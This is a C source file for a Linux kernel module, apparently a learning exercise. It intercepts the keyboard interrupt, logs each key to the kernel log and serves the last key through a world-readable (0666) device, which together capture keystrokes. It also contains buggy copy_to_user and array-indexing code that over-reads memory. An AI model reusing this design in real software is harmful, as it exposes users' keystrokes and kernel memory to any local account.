#include <linux/kernel.h>	
#include <linux/module.h>	
#include <linux/sched.h>
#include <linux/workqueue.h>
#include <linux/interrupt.h>	
#include <asm/io.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/init.h>
#include <linux/cdev.h>
#include <linux/slab.h>
#include<linux/device.h>
#include<linux/miscdevice.h>

#define CH_DEV_NAME     "char_dev_misc"
#define SUCCESS 0

static unsigned char scancode;
irqreturn_t dev_id;
char value;
char kb_arr[]="  1234567890-=  qwertyuiop[]  asdfghjkl;'   zxcvbnm,./";
int irq=1;
static volatile int cond=0;
DECLARE_WAIT_QUEUE_HEAD(que);
static int ch_dev_open(struct inode *inode,struct file  *file)
{
        pr_info("open operation success \n");
        return SUCCESS;

}

static int ch_dev_release(struct inode *inode, struct file *file)
{
        pr_info("release operation success \n");
        return SUCCESS;
}



static ssize_t ch_dev_read(struct file *file,char *buf,size_t lbuf,loff_t *ppos)
{
	pr_info("read function\n");
        wait_event_interruptible(que,cond);
        cond=0;
        copy_to_user( buf,&value,lbuf );
        return 1;
}



static struct file_operations ch_dev_fops = {
        .owner   =   THIS_MODULE,
        .read    =   ch_dev_read,
        .open    =   ch_dev_open,
        .release =   ch_dev_release
};

struct miscdevice mymisc={
        .minor=MISC_DYNAMIC_MINOR,
        .name=CH_DEV_NAME,
        .fops=&ch_dev_fops,
        .mode=0666
	};


static void got_char(void)
{
	if(scancode & 0x80){
		scancode=(int)scancode & 0x7F;
		pr_info("Scan Code: %d -->%c\n",scancode,kb_arr[scancode]);
		value=kb_arr[scancode];
	}
	
}

irqreturn_t irq_handler(int irq, void *dev_id)
{
	unsigned char status;
	if(cond)
	 return IRQ_HANDLED;
	/* 
	 * Read keyboard status
	 */
	status = inb(0x64);
	scancode = inb(0x60);

	got_char();
	cond=1;
	wake_up_interruptible(&que);
	return IRQ_HANDLED;
}

int init_module(void)
{
	misc_register(&mymisc);
	return request_irq(irq,irq_handler,IRQF_SHARED, "test_keyboard_irq_handler",&dev_id);
}

void cleanup_module(void)
{
	free_irq(1, &dev_id);
	misc_deregister(&mymisc);
}

MODULE_LICENSE("GPL");
